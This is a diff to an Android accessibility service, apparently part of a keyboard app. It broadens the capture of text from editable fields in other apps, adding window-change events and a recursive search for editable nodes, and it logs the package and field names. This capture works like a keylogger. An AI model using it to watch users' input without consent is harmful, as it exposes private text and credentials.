@@ -32,6 +32,9 @@ public class KeyboardAccessibilityService extends AccessibilityService {
                 if (focused == null) {
                     focused = root.findFocus(AccessibilityNodeInfo.FOCUS_ACCESSIBILITY);
                 }
+                if (focused == null) {
+                    focused = findEditableNode(root);
+                }
                 captureFromNode(focused, lastFocusedPackage, lastFocusedField, lastFocusedClassName, pendingCaptureMethod);
             } finally {
                 if (focused != null && focused != root) {
@@ -52,7 +55,9 @@ public class KeyboardAccessibilityService extends AccessibilityService {
         AccessibilityServiceInfo info = new AccessibilityServiceInfo();
         info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                 | AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED
-                | AccessibilityEvent.TYPE_VIEW_FOCUSED;
+                | AccessibilityEvent.TYPE_VIEW_FOCUSED
+                | AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
+                | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
         info.notificationTimeout = 50;
         info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
@@ -90,6 +95,20 @@ public class KeyboardAccessibilityService extends AccessibilityService {
 
         if (eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
             scheduleFocusedNodeCapture("accessibility_focus");
+            return;
+        }
+
+        if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+            if (source != null && source.isEditable()) {
+                captureFromNode(source, lastFocusedPackage, lastFocusedField, lastFocusedClassName, "accessibility_window_content_changed");
+            } else {
+                scheduleFocusedNodeCapture("accessibility_window_content_changed");
+            }
+            return;
+        }
+
+        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            scheduleFocusedNodeCapture("accessibility_window_state_changed");
         }
     }
 
@@ -288,5 +307,20 @@ public class KeyboardAccessibilityService extends AccessibilityService {
         }
         int unicode = event.getUnicodeChar();
         return unicode > 0 && !Character.isISOControl(unicode);
+    }
+
+    private AccessibilityNodeInfo findEditableNode(AccessibilityNodeInfo root) {
+        if (root == null) return null;
+        if (root.isEditable()) return root;
+        for (int i = 0; i < root.getChildCount(); i++) {
+            AccessibilityNodeInfo child = root.getChild(i);
+            if (child == null) continue;
+            AccessibilityNodeInfo match = findEditableNode(child);
+            if (match != null) {
+                return match;
+            }
+            child.recycle();
+        }
+        return null;
     }
 }
